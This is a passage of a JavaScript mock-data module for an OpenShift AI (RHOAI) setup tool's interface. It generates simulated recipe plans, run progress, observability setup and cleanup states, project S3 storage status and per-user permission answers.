    out.push(["model", `Model ${MODEL_NAMES[f.models.model || "qwen25-05b-instruct"] ?? f.models.model}`, 300, 900]);
    if (f.maas?.enabled && f.maas.publish && f.models.exposure !== "maas") out.push(["maas-publish", "Publish the model through MaaS", 120, 900]);
  }
  if (f.playground?.enabled) out.push(["playground", "Playground", 120, 540]);
  if (f.modelRegistry?.enabled) out.push(["model-registry", "Model registry", 120, 720]);
  if (f.workbench?.enabled) out.push(["workbench", "Workbench", 30, 900]);
  const kueueSteps = [["kueue-prereq", "What distributed workloads need", 120, 900], ["kueue", "Distributed workloads", 60, 600]];
  if (f.kueue?.enabled && !recipeKueueFirst(rcp)) out.push(...kueueSteps);
  // Distributed workloads before the workloads (internal/recipe inRunOrder): right after the first steps.
  if (recipeKueueFirst(rcp)) out.splice(out.findLastIndex(([id]) => RECIPE_FIRST.includes(id)) + 1, 0, ...kueueSteps);
  const d = sp.dashboardDev ?? {};
  if (d.deploy === "main" || d.deploy === "pr") out.push(["dashboard-dev", d.deploy === "pr" ? `Dashboard Dev (PR #${d.pr})` : "Dashboard Dev (main)", 180, 480]);
  return out;
}

/**
 * The run's order (pkg/cluster internal/recipe runOrder): the first steps one after another, then the lanes side by
 * side, then the last steps once every lane ended; the Kueue steps right after the first steps when the recipe sets
 * up distributed workloads before its workloads (KueueFirst), else right before the last steps.
 */
const RECIPE_FIRST = ["rhoai", "dsc", "project", "prerequisites"];
const RECIPE_LANES = [["s3", "pipeline-server", "workbench"], ["mlflow", "mlflow-samples"], ["model-registry"], ["maas", "models-prereq", "model", "maas-publish", "playground"]];
const RECIPE_KUEUE = ["kueue-prereq", "kueue"];
const RECIPE_LAST = ["dashboard-dev"];

/**
 * internal/recipe KueueFirst for the mock's cluster, where the dashboard's Kueue setting is off: distributed
 * workloads come first when the recipe turns the setting on.
 */
export function recipeKueueFirst(rcp) {
  const k = rcp.spec.features.kueue;
  return !!(k?.enabled && k.dashboardOptIn);
}

/** Each step's After (internal/recipe withAfter), for the step IDs of a run. */
export function recipeAfter(ids, kueueFirst = false) {
  const after = {};
  const chain = (list, deps) => list.filter((id) => ids.includes(id)).reduce((d, id) => { after[id] = d; return [id]; }, deps);
  const head = chain(kueueFirst ? [...RECIPE_FIRST, ...RECIPE_KUEUE] : RECIPE_FIRST, []);
  const ends = RECIPE_LANES.flatMap((lane) => { const end = chain(lane, head); return end === head ? [] : end; });
  chain(kueueFirst ? RECIPE_LAST : [...RECIPE_KUEUE, ...RECIPE_LAST], ends.length ? ends : head);
  return after;
}

/** How long steps take together as the runner runs them (internal/recipe RunSeconds): at most 3 at once, each after its After. */
export function recipeRunSeconds(ids, seconds, kueueFirst = false) {
  const after = recipeAfter(ids, kueueFirst);
  const ends = {};
  let now = 0;
  const running = new Set();
  while (Object.keys(ends).filter((id) => ends[id] <= now && !running.has(id)).length < ids.length) {
    for (const id of ids) {
      if (id in ends || running.size >= 3 || !(after[id] ?? []).every((a) => a in ends && !running.has(a))) continue;
      ends[id] = now + seconds[ids.indexOf(id)];
      running.add(id);
    }
    if (running.size === 0) break;
    now = Math.min(...[...running].map((id) => ends[id]));
    for (const id of [...running]) if (ends[id] === now) running.delete(id);
  }
  return now;
}

export const recipePinned = () => ({ tag: "rhoai-3.6", image: LATEST_IMAGE, digest: digest(latestBuild.seed) });

/** The steps a mixed plan finds set up, with why. */
const MIXED_SKIP = {
  prerequisites: "Everything the features need is there.", s3: "The S3 storage is set up and ready.", "pipeline-server": "The pipeline server in PROJECT is ready.",
  mlflow: "MLflow is ready.", maas: "The MaaS platform is ready.",
};
const MIXED_BLOCKED = "Project PROJECT has a workbench nightly-workbench that this tool did not create; the recipe does not change it. Nothing was changed.";

/** RecipeFix pointing users to Status when one-time setup is incomplete (pkg/types RecipeFix). */
const ONE_TIME_SETUP_FIX = { code: "one_time_setup_missing", page: "/" };

/**
 * recipePlan for an RHOAI-only cluster: keep installed operator, defer DSC and
 * downstream checks until runtime. blocked injects missing one-time-setup errors
 * with navigation fixes plus a build-resolution problem.
 */
export function recipePlan(rcp = recipe(), installed = true, blocked = false, mixed = false) {
  const steps = recipeSteps(rcp).map(([id, title, typicalSeconds, maxSeconds], i) => {
    // A cluster where some of it is set up and one step is blocked: what a review shows.
    const proj = rcp.spec.project?.name ?? "recipe-dev";
    if (mixed && MIXED_SKIP[id]) return { id, title, action: "skip", reason: MIXED_SKIP[id].replace("PROJECT", proj), typicalSeconds, maxSeconds };
    if (mixed && id === "workbench") return { id, title, action: "blocked", reason: MIXED_BLOCKED.replace("PROJECT", proj), fix: { code: "feature_blocked", page: "/environment" }, typicalSeconds, maxSeconds };
    if (mixed && i > 0 && !MIXED_SKIP[id]) return { id, title, action: id === "project" || id === "dsc" ? "skip" : "run", ...(id === "dsc" ? { reason: "DataScienceCluster default-dsc exists." } : id === "project" ? { reason: `Project ${proj} was created by a recipe.` } : {}), typicalSeconds, maxSeconds };
    if (id === "rhoai" && blocked) return { id, title, action: "blocked", reason: "The one-time cluster setup is not done: additional-pull-secret is missing in kube-system.", fix: ONE_TIME_SETUP_FIX, typicalSeconds, maxSeconds };
    if (id === "rhoai" && installed) return { id, title, action: "skip", reason: "RHOAI 3.6.0 is installed; the recipe keeps it.", typicalSeconds, maxSeconds };
    if (i <= 2) return { id, title, action: "run", typicalSeconds, maxSeconds };
    return { id, title, action: "later", reason: "Checked when the run gets here: it depends on a step before it.", typicalSeconds, maxSeconds };
  });
  const counted = steps.filter((s) => s.action !== "skip");
  return {
    recipe: rcp, steps, pinned: recipePinned(),
    problems: mixed ? [{ message: `Workbench: ${MIXED_BLOCKED.replace("PROJECT", rcp.spec.project?.name ?? "recipe-dev")}`, fix: { code: "feature_blocked", page: "/environment" } }] : blocked ? [
      { message: "The one-time cluster setup is not done: additional-pull-secret is missing in kube-system. Run the one-time setup on the Status page first.", fix: ONE_TIME_SETUP_FIX },
      { field: "spec.rhoai.build", message: "Cannot resolve the build on Quay.", fix: { code: "build_unresolvable" } },
    ] : [],
    // The steps of independent lanes run side by side: about the longest chain, not the sum.
    typicalSeconds: recipeRunSeconds(steps.map((s) => s.id), steps.map((s) => (counted.includes(s) ? s.typicalSeconds : 0)), recipeKueueFirst(rcp)),
    maxSeconds: recipeRunSeconds(steps.map((s) => s.id), steps.map((s) => (counted.includes(s) ? s.maxSeconds : 0)), recipeKueueFirst(rcp)),
    ...([...kueueWarnings(rcp), ...playgroundWarnings(rcp)].length ? { warnings: [...kueueWarnings(rcp), ...playgroundWarnings(rcp)] } : {}),
  };
}

/** The plan's warning that the playground reaches the model through Models as a Service (pkg/cluster internal/recipe playgroundWarnings). */
function playgroundWarnings(rcp) {
  const f = rcp.spec.features;
  const maas = f.models?.enabled && ((f.maas?.enabled && f.maas.publish) || f.models.exposure === "maas");
  if (!f.playground?.enabled || !maas) return [];
  const how = f.models.exposure === "maas" ? "it is reached through Models as a Service" : "the run publishes it there";
  const entry = MODEL_CATALOG.find((c) => c.name === (f.models.model || "qwen25-05b-instruct"));
  return [{ kind: "advice", message: `Model ${entry?.displayName ?? f.models.model} is offered to the playground only through Models as a Service (${how}), so the playground uses it from there: the dashboard sets the playground up with your sign-in, as when you choose a Models as a Service model in its Gen AI studio. Chatting with it needs a Models as a Service subscription to it.` }];
}

/** The plan's warnings for distributed workloads (pkg/cluster internal/recipe kueueWarnings). */
function kueueWarnings(rcp) {
  const f = rcp.spec.features;
  if (!f.kueue?.enabled) return [];
  const others = [f.pipelines?.enabled && "a pipeline server", f.models?.enabled && "a model", f.models?.enabled && f.playground?.enabled && "a playground",
    f.mlflow?.enabled && f.mlflow.samples && "the MLflow samples", f.workbench?.enabled && "a workbench"].filter(Boolean);
  const out = [];
  if (others.length) {
    const list = others.length === 1 ? others[0] : `${others.slice(0, -1).join(", ")} and ${others[others.length - 1]}`;
    out.push({ kind: "advice", message: `Project ${rcp.spec.project?.name ?? "recipe-dev"} also gets ${list}. Kueue manages only what is sent to a queue, so they keep running. A project of its own is still safer.` });
  }
  if (f.kueue.dashboardOptIn) out.push({ kind: "cluster", message: "The dashboard's Kueue setting is turned on: in every new project on this cluster, workbenches and model deployments can only use the queue hardware profile, and a project without its own LocalQueue cannot create workbenches or deploy models until an admin adds one." });
  return out;
}

/**
 * Synthetic recipe run: first `done` steps succeed (RHOAI skipped if present),
 * index `done` reflects `current`, remainder pending. Timestamps rewind from NOW.
 * created marks recipe-owned resources (project plus DSC prereq toggles) but never
 * shared S3, MLflow, or pipeline servers.
 */
export function recipeRun({ done = 0, current = "running", message = "", state = "running", stopReason = "", errorCode = "", pod = "rhoai-nightly-updater-6f7b8c9d5-x2k4p", rcp = recipe() } = {}) {
  const start = 2 + done * 2.5;
  const project = rcp.spec.project?.name ?? "recipe-dev";
  const steps = recipeSteps(rcp).map(([id, title, typicalSeconds, maxSeconds], i) => {
    const times = { typicalSeconds, maxSeconds };
    if (i < done) {
      return id === "rhoai"
        ? { id, title, ...times, status: "skipped", message: "Already set up: RHOAI 3.6.0 is installed; the recipe keeps it.", startedAt: ago(start), finishedAt: ago(start) }
        : { id, title, ...times, status: "success", ...(RECIPE_OWNS.has(id) ? { created: true } : {}), message: (id === "prerequisites" ? prerequisitesDone(rcp) : RECIPE_DONE[id] ?? `${title} is set up.`).replaceAll("recipe-dev", project), startedAt: ago(start - i * 2.5), finishedAt: ago(start - (i + 1) * 2.5) };
    }
    if (i === done && current) {
      return { id, title, ...times, status: current, ...(message ? { message } : {}), ...(current === "failed" ? { errorCode: "timeout", ...(RECIPE_OWNS.has(id) ? { created: true } : {}), finishedAt: ago(0.5) } : {}), startedAt: ago(1.2) };
    }
    return { id, title, ...times, status: "pending" };
  });
  const components = Object.entries(RECIPE_COMPONENTS).filter(([id]) => steps.some((s) => s.id === id && s.created)).flatMap(([, keys]) => keys(rcp.spec.features));
  // The cluster-wide parts the run created (they were not this tool's before their step).
  const createdParts = [["maas", "maas-platform", "uid-maas-db-creds"], ["model-registry", "model-registry", "uid-nightly-registry"], ["kueue", "kueue", "uid-nightly-kueue"]]
    .filter(([id]) => steps.some((s) => s.id === id && s.status === "success")).map(([, part, uid]) => ({ part, uid }));
  return {
    id: "run-7c1e", operationId: "op-recipe", bootId: "b-4e2a", pod, user: USER, startedAt: ago(start),
    ...(state !== "running" ? { finishedAt: ago(0.5) } : {}), state, ...(stopReason ? { stopReason } : {}), ...(errorCode ? { errorCode } : {}),
    recipe: rcp, pinned: recipePinned(), project: { name: project, uid: "5d1c0a3e-9b7f-4c2e-8a61-2f0d9e4b7c13", owned: true }, steps,
    ...(components.length ? { components, componentIds: Object.fromEntries(components.map((k) => [k, enablementId(k)])) } : {}),
    ...(rcp.spec.features.models?.enabled && steps.some((s) => (s.id === "models-prereq" || s.id === "model") && s.status === "success") ? { exposure: rcp.spec.features.models.exposure || "default-gateway" } : {}),
    ...(createdParts.length ? { createdParts } : {}),
  };
}

/** The prerequisites record's enablement ID of a component (pkg/cluster/internal/features prereqComponent ID). */
export const enablementId = (key) => `e1a7${[...key].reduce((n, ch) => (n * 31 + ch.charCodeAt(0)) >>> 0, 7).toString(16).padStart(8, "0")}0c9d`;

/** The prerequisites step's result (pkg/cluster internal/features RunPrerequisitesSet). */
function prerequisitesDone(rcp) {
  const f = rcp.spec.features;
  const titles = [f.pipelines?.enabled && "Pipelines", f.mlflow?.enabled && "MLflow", f.models?.enabled && "Models", f.playground?.enabled && "Playground",
    f.modelRegistry?.enabled && "Model registry", f.kueue?.enabled && "Distributed workloads"].filter(Boolean);
  const what = titles.length === 1 ? titles[0] : `${titles.slice(0, -1).join(", ")} and ${titles[titles.length - 1]}`;
  return `What ${what} ${titles.length === 1 ? "needs" : "need"} on the cluster is set up.`;
}

/** Step IDs the recipe may mark created (project + DSC prereq phases). */
const RECIPE_OWNS = new Set(["project", "prerequisites", "kueue-prereq", "maas", "model-registry", "kueue"]);

/** The DSC components a prereq step turns on, for the recipe's features. */
const RECIPE_COMPONENTS = {
  prerequisites: (f) => [f.pipelines?.enabled && "aipipelines", f.mlflow?.enabled && "mlflowoperator", f.models?.enabled && "kserve",
    f.playground?.enabled && "ogx", f.playground?.enabled && "dashboard", f.modelRegistry?.enabled && "modelregistry"].filter(Boolean),
  "kueue-prereq": () => ["kueue"],
};

/**
 * Cleanup payload for GET /api/recipes/run derived from pkg/cluster/internal/recipe
 * Ownership—recipe-owned project plus enabled components, or null.
 */
export function recipeCleanup(run) {
  const req = {
    ...(run.project?.owned ? { recipeProjects: [run.project.name], recipeProjectUIDs: { [run.project.name]: run.project.uid || "uid-recipe-dev" } } : {}),
    ...(run.createdParts?.some((p) => p.part === "model-registry") ? { modelRegistry: true, modelRegistryUid: run.createdParts.find((p) => p.part === "model-registry").uid } : {}),
    ...(run.createdParts?.some((p) => p.part === "maas-platform") ? { maasPlatform: true, maasPlatformUid: run.createdParts.find((p) => p.part === "maas-platform").uid } : {}),
    ...(run.createdParts?.some((p) => p.part === "kueue") ? { kueue: true, kueueUid: run.createdParts.find((p) => p.part === "kueue").uid } : {}),
    ...(run.createdParts?.length ? { recipeRunId: run.id } : {}),
    ...(run.components?.length ? { components: run.components, ...(run.componentIds ? { componentIds: run.componentIds } : {}) } : {}),
  };
  return Object.keys(req).length ? req : null;
}

/**
 * recipeProjects list either from world scenario or from the latest owned run
 * (GET /api/recipes/run projects / GET /api/resources/status recipeProjects).
 */
export function recipeProjects(w) {
  if (w.recipeProjects) return w.recipeProjects;
  const run = w.recipeRun?.run;
  return run?.project?.owned ? [{ name: run.project.name, uid: run.project.uid || "uid-recipe-dev", recipe: run.recipe.metadata.name, createdAt: run.startedAt }] : [];
}

const RECIPE_DONE = {
  dsc: "DataScienceCluster default-dsc created with the release's default components.",
  project: "Created project recipe-dev.",
  s3: "S3 storage (SeaweedFS) deployed with bucket 'pipelines'.",
  "pipeline-server": "The pipeline server in recipe-dev is ready.",
  mlflow: "MLflow is ready.",
  "mlflow-samples": "Samples added in project 'recipe-dev'.",
  maas: "The MaaS platform is set up and ready.",
  "models-prereq": "What Models needs on the cluster is set up.",
  model: "qwen3-1-7b in recipe-dev serves, through the cluster's default gateway.",
  "maas-publish": "Published qwen3-1-7b in recipe-dev through MaaS.",
  playground: "The playground in recipe-dev is ready, with qwen3-1-7b.",
  "model-registry": "Model registry nightly-registry is ready in rhoai-model-registries. Sample model mnist (version v1) is registered.",
  workbench: "Workbench nightly-workbench is starting in recipe-dev with Jupyter | Data Science | CPU | Python 3.12 on hardware profile Default.",
  "kueue-prereq": "What Distributed workloads needs on the cluster is set up.",
  kueue: "Distributed workloads are set up in recipe-dev with the RayCluster sample; Kueue admits it when the quota allows.",
  "dashboard-dev": "Deployed PR #4321, its build for RHOAI (the dashboard images made for RHOAI, not ODH); the dashboard is ready.",
};

// --- Observability (GET /api/resources/observability, pkg/cluster observability.GetStatus) ---

const OBS_NS = "redhat-ods-monitoring";
const OBS_DOCS = "https://github.com/opendatahub-io/odh-observability/blob/main/docs/";
const obsOperator = (id, title, version, ns, ready) => (ready
  ? { id, title, state: "ready", message: `Version ${version} runs in ${ns}`, notManaged: id === "cert-manager" }
  : { id, title, state: "missing", message: `Not installed. Set up installs version ${version} from redhat-operators (channel ${id === "loki-operator" ? "stable-6.7" : "stable"}).` });
const OBS_VOLUMES = [
  ["prometheus-data-science-monitoringstack-db-prometheus-data-science-monitoringstack-0", "5Gi"],
  ["prometheus-data-science-monitoringstack-db-prometheus-data-science-monitoringstack-1", "5Gi"],
  ["storage-data-science-perses-0", "1Gi"],
  ["storage-data-science-usage-logs-lokistack-compactor-0", "10Gi"],
  ["storage-data-science-usage-logs-lokistack-index-gateway-0", "10Gi"],
  ["storage-data-science-usage-logs-lokistack-ingester-0", "10Gi"],
  ["wal-data-science-usage-logs-lokistack-ingester-0", "10Gi"],
].map(([name, size]) => ({ name, size, storageClass: "gp3-csi", setUpByTool: true }));

/** The Observability tab in a state: "none", "ready", "collector-stuck", "dashboards-pending", "external", "no-storage". */
export function observabilityWorld(state = "none") {
  const set = ["ready", "collector-stuck", "dashboards-pending"].includes(state);
  const ops = [
    obsOperator("cert-manager", "cert-manager Operator for Red Hat OpenShift", "1.20.1", "cert-manager-operator", true),
    obsOperator("cluster-observability-operator", "Cluster Observability Operator", "1.5.5", "openshift-cluster-observability-operator", set || state === "external"),
    obsOperator("opentelemetry", "Red Hat build of OpenTelemetry", "0.158.0", "openshift-opentelemetry-operator", set || state === "external"),
    obsOperator("loki-operator", "Loki Operator", "6.7.0", "openshift-operators-redhat", set || state === "external"),
  ];
  if (set) for (const o of ops.slice(1)) o.managedByTool = true;
  const conditionPart = (id, title, readyText, doc, notConfigured) => (set || state === "external"
    ? { id, title, state: "ready", message: readyText, docUrl: OBS_DOCS + doc }
    : { id, title, state: "missing", message: `Not deployed yet. Once the DSCInitialization's monitoring fields are set, RHOAI's operator deploys ${notConfigured}.`, docUrl: OBS_DOCS + doc });
  const parts = [
    ...ops,
    state === "no-storage"
      ? { id: "usage-logs-storage", title: "Usage-logs storage", state: "problem", message: "Usage logs get an S3 key of their own, which needs secured S3 storage (IAM writes on): use Secure S3 storage on the S3 storage tab first.", docUrl: OBS_DOCS + "observability-modes.md#usage-logs-storage" }
      : state === "external"
        ? { id: "usage-logs-storage", title: "Usage-logs storage", state: "ready", notManaged: true, message: `Configured, not by this tool: usage logs use Secret ${OBS_NS}/team-s3. This tool leaves it as it is.`, docUrl: OBS_DOCS + "observability-modes.md#usage-logs-storage" }
        : set
          ? { id: "usage-logs-storage", title: "Usage-logs storage", state: "ready", managedByTool: true, message: `Bucket rhoai-usage-logs-3f9a1c on this tool's S3 storage, SeaweedFS user rnu-usage-logs-3f9a1c whose key reaches that bucket only, and Secret ${OBS_NS}/rhoai-nightly-updater-usage-logs with that key (set up by this tool).`, docUrl: OBS_DOCS + "observability-modes.md#usage-logs-storage" }
          : { id: "usage-logs-storage", title: "Usage-logs storage", state: "missing", message: `Not set up. Set up makes a bucket rhoai-usage-logs-<random suffix> on this tool's S3 storage, a SeaweedFS user with a key that reaches that bucket only, and Secret ${OBS_NS}/rhoai-nightly-updater-usage-logs with that key.`, docUrl: OBS_DOCS + "observability-modes.md#usage-logs-storage" },
    set || state === "external"
      ? { id: "monitoring-settings", title: "Monitoring settings (DSCInitialization)", state: "ready", managedByTool: set, notManaged: !set, message: `DSCInitialization default-dsci sets spec.monitoring.metrics.storage (${set ? "by this tool" : "not by this tool"}) and spec.monitoring.usageLogs (${set ? "by this tool" : "not by this tool"}).`, docUrl: OBS_DOCS + "usage-logs.md#enable-usage-logs" }
      : { id: "monitoring-settings", title: "Monitoring settings (DSCInitialization)", state: "missing", message: "DSCInitialization default-dsci has no spec.monitoring.metrics.storage or spec.monitoring.usageLogs. Set up adds them as RHOAI's docs write them: metrics with 5Gi of disk kept 90d (this also deploys Perses, the dashboards), usage logs on a 1x.demo LokiStack, a test size (not for production).", docUrl: OBS_DOCS + "usage-logs.md#enable-usage-logs" },
    conditionPart("monitoring-stack", "Metrics stack and Perses", "The metrics stack (Prometheus, Thanos) and Perses, the dashboards' server: RHOAI's operator reports MonitoringStackAvailable and PersesAvailable True.", "observability-modes.md#metrics", "the metrics stack (Prometheus, Thanos) and Perses, the dashboards' server"),
    conditionPart("usage-logs", "Usage logs (LokiStack and collector)", "The usage-logs LokiStack and its collector: RHOAI's operator reports UsageLogsLokiStackAvailable and UsageLogsCollectorAvailable True.", "usage-logs.md", "the usage-logs LokiStack and its collector"),
    state === "collector-stuck"
      ? { id: "metrics-collector", title: "Metrics collector (OpenTelemetry)", state: "problem", docUrl: OBS_DOCS + "observability-modes.md#metrics",
        message: "RHOAI reports the collector available, but its pods data-science-collector-collector-0, data-science-collector-collector-1 wait for Secret data-science-collector-ta-client-cert, which was never made: the built-in metrics are not collected (usage logs are not affected). This is a product bug in RHOAI's monitoring and the OpenTelemetry operator: the operator checks for cert-manager once when it starts, before RHOAI's monitoring gives it cert-manager's permissions, and then never makes the collector's certificates.",
        commands: "# Not in RHOAI docs; worked in our test: restart the OpenTelemetry operator once (OLM makes its pod again).\noc delete pod -n openshift-opentelemetry-operator -l control-plane=controller-manager" }
      : conditionPart("metrics-collector", "Metrics collector (OpenTelemetry)", "The metrics collector: RHOAI's operator reports OpenTelemetryCollectorAvailable True.", "observability-modes.md#metrics", "the metrics collector"),
    state === "dashboards-pending"
      ? { id: "dashboards", title: "Dashboards (Perses)", state: "waiting", docUrl: OBS_DOCS + "usage-logs.md#dashboards",
        message: "Not in Perses yet: dashboard dashboard-1-llm-d (PersesBackendError: connection refused); dashboard usage (PersesBackendError: connection refused). They were made before Perses ran; the Perses operator retries them by itself, with growing pauses. This tool does not change them." }
      : conditionPart("dashboards", "Dashboards (Perses)", "Perses runs, with the 5 dashboards RHOAI and MaaS made for it: in the RHOAI dashboard, Observe & monitor, Dashboard.", "usage-logs.md#dashboards", "Perses, which serves the usage and metrics dashboards"),
  ];
  const out = {
    namespace: OBS_NS, configured: set || state === "external", managedByTool: set, external: state === "external",
    ready: state === "ready" || state === "external", parts, dashboardUrl: "https://rh-ai.apps.example-cluster.example.com",
  };
  if (!set && state !== "external") {
    out.setupPlan = [
      "Install Cluster Observability Operator 1.5.5: Namespace openshift-cluster-observability-operator, OperatorGroup openshift-cluster-observability-operator/openshift-cluster-observability-operator, Subscription openshift-cluster-observability-operator/cluster-observability-operator (package cluster-observability-operator, channel stable, from redhat-operators, automatic updates); it stays after Clean up, as other features share it",
      "Install Red Hat build of OpenTelemetry 0.158.0: Namespace openshift-opentelemetry-operator, OperatorGroup openshift-opentelemetry-operator/openshift-opentelemetry-operator, Subscription openshift-opentelemetry-operator/opentelemetry-product (package opentelemetry-product, channel stable, from redhat-operators, automatic updates); it stays after Clean up, as other features share it",
      "Install Loki Operator 6.7.0: OperatorGroup openshift-operators-redhat/openshift-operators-redhat, Subscription openshift-operators-redhat/loki-operator (package loki-operator, channel stable-6.7, from redhat-operators, automatic updates); it stays after Clean up, as other features share it",
      "On this tool's S3 storage: a bucket rhoai-usage-logs-<random suffix>, and a SeaweedFS user rnu-usage-logs-<the same suffix> with a key that reaches that bucket only; their names are recorded on the DSCInitialization before they are made",
      `Secret ${OBS_NS}/rhoai-nightly-updater-usage-logs with the seven keys RHOAI's docs list (the key, the bucket, the in-cluster S3 address)`,
      "DSCInitialization default-dsci: add spec.monitoring.metrics.storage (size 5Gi, retention 90d) and spec.monitoring.usageLogs (size 1x.demo, S3 storage in Secret rhoai-nightly-updater-usage-logs, credentialMode static, the cluster's default StorageClass); this tool records what it added in annotation rhoai-nightly-updater/monitoring, and Clean up puts it back",
      "Wait until RHOAI's operator reports the monitoring stack, Perses, the usage-logs LokiStack and collector available (about 3 minutes)",
    ];
  }
  if (state === "no-storage") out.setupBlockedReason = "Usage logs get an S3 key of their own, which needs secured S3 storage (IAM writes on): use Secure S3 storage on the S3 storage tab first.";
  if (set || state === "external") {
    out.volumes = state === "external" ? OBS_VOLUMES.map((v) => ({ ...v, setUpByTool: false })) : OBS_VOLUMES;
    out.volumesTotal = "51Gi";
  }
  if (set) {
    out.cleanupPlan = [
      "DSCInitialization default-dsci: remove spec.monitoring.metrics.storage and spec.monitoring.usageLogs, as before this tool's setup; RHOAI's operator then deletes the stack",
      `Delete the 7 PersistentVolumeClaims the stack left in ${OBS_NS}, 51Gi in total, with their data (metrics and usage logs): ${OBS_VOLUMES.map((v) => `${v.name} (${v.size})`).join(", ")}`,
      `Delete the Secrets the stack left in ${OBS_NS} (certificates): data-science-collector-ca-cert, data-science-collector-ta-client-cert, data-science-collector-ta-server-cert, prometheus-web-tls-ca`,
      `Delete Secret ${OBS_NS}/rhoai-nightly-updater-usage-logs, SeaweedFS user rnu-usage-logs-3f9a1c with its key, and bucket rhoai-usage-logs-3f9a1c with the usage logs in it`,
    ];
    out.cleanupKept = ["The Cluster Observability Operator, Red Hat build of OpenTelemetry, Loki Operator and cert-manager: left in place, as other features and admins share them"];
  }
  return out;
}

// GET /api/resources/projects/capabilities for a user with the edit role in
// the project (pkg/api capabilities_handlers.go): every project action
// allowed except Regenerate, which stays a cluster-admin's.
const USER_ACTIONS = {
  "mlflow-samples.add": "Add MLflow sample data",
  "mlflow-samples.regenerate": "Regenerate the MLflow demo",
  "mlflow-samples.remove": "Remove MLflow sample data",
  "playground.setup": "Set up the playground",
  "playground.teardown": "Delete the playground",
  "workbench.delete-storage": "Delete the workbench's kept storage",
  "workbench.setup": "Set up the workbench",
  "workbench.start": "Start the workbench",
  "workbench.stop": "Stop the workbench",
  "workbench.teardown": "Delete the workbench",
  "project-s3.setup": "Set up the project's S3 storage",
  "project-s3.repair": "Repair the project's S3 storage",
  "project-s3.delete": "Delete the project's S3 storage",
  "project-pipeline-server.setup": "Set up the pipeline server on the project's S3 storage",
  "project-pipeline-server.teardown": "Delete the pipeline server on the project's S3 storage",
  "models.setup": "Deploy a model",
  "models.setup-token": "Deploy a model with token authentication",
  "models.teardown": "Delete a model",
};

/** GET /api/resources/project-s3 (pkg/types ProjectStorageStatus): ready in dev-project, used by its pipeline server; none elsewhere. */
export function projectStorage(project) {
  const deployed = project === "dev-project";
  const objects = [["PersistentVolumeClaim", "nightly-s3-data"], ["Secret", "nightly-s3-credentials"], ["NetworkPolicy", "nightly-s3-ingress"], ["Deployment", "nightly-s3"], ["Service", "nightly-s3"]]
    .map(([kind, name]) => ({ kind, name, present: deployed, owned: deployed }));
  return {
    project, name: "nightly-s3", endpoint: `http://nightly-s3.${project}.svc:8333`, bucket: "pipelines", dataVolume: "nightly-s3-data",
    deployed, managedByTool: deployed, recorded: deployed, ready: deployed, terminating: false, message: deployed ? "Running" : "Not set up",
    objects, ...(deployed ? { usedBy: ["dspa"] } : {}),
  };
}
// The docs' user is a project editor: Kubernetes edit has no Roles or
// RoleBindings, so a model's token authentication is refused with the
// project-admin wording (pkg/cluster missingText).
const editorTokenText = (project) => `Token authentication creates a Role and a RoleBinding in ${project}, which needs the project's admin role. Ask an admin of ${project}, or deploy without token authentication.`;
/** A user's answer of GET /api/resources/models/exposures (pkg/cluster ProjectModelExposures): the gateway as a yes or no for the project. */
export function userModelExposures(project, model, admits = true) {
  return {
    project, model, default: admits ? "default-gateway" : "internal", authReady: false, capacity: "fits",
    defaultReason: admits ? "works from your laptop with an OpenShift token, the way the dashboard deploys models; it needs token authentication." : "the cluster's inference gateway can't be used from this project.",
    gateway: admits ? { admits: true } : { admits: false, problem: "not-admitted" },
    options: [
      { key: "default-gateway", exposure: "default-gateway", title: "Through the cluster's inference gateway", available: admits,
        description: `Reachable from outside the cluster. Each call needs an OpenShift token that can see ${project}. Needs token authentication, which needs the project's admin role.`,
        ...(admits ? { address: `https://inference.apps.example.com/${project}/${model}` } : { reason: `The cluster's inference gateway does not admit project ${project}. A cluster-admin can allow project ${project} on the inference gateway (Models tab, Allow).` }) },
      { key: "internal", exposure: "internal", title: "Only inside the cluster", available: true,
        description: "No outside address. Programs on this cluster (for example a workbench) can call it without a token.",
        warning: "Calls to the in-cluster address are not authenticated: any pod on the cluster whose network can reach the project can use the model." },
    ],
  };
}
export function userCapabilities(project) {
  const actions = {};
  for (const [id, label] of Object.entries(USER_ACTIONS)) {
    // The docs persona edits the project: its S3 storage is for the project's admins.
    const adminOnly = `Only an admin of project ${project} sets up, repairs and deletes its S3 storage (the OpenShift admin role there); ask an admin of project ${project}.`;
    actions[id] = id === "mlflow-samples.regenerate"
      ? { label, allowed: false, code: "admin_only", reason: `${label} is done by a cluster-admin in this tool.`, missing: [], blockedBy: [] }
      : id.startsWith("project-s3.")
        ? { label, allowed: false, code: "missing_permissions", reason: `${label} in ${project} needs permissions your OpenShift account does not have: ${adminOnly}`, missing: [adminOnly], blockedBy: [] }
      : id === "models.setup-token"
        ? { label, allowed: false, code: "missing_permissions", reason: editorTokenText(project), missing: [editorTokenText(project)], blockedBy: [] }
        : { label, allowed: true, missing: [], blockedBy: [] };
  }
  return { project, role: "user", actions };
}
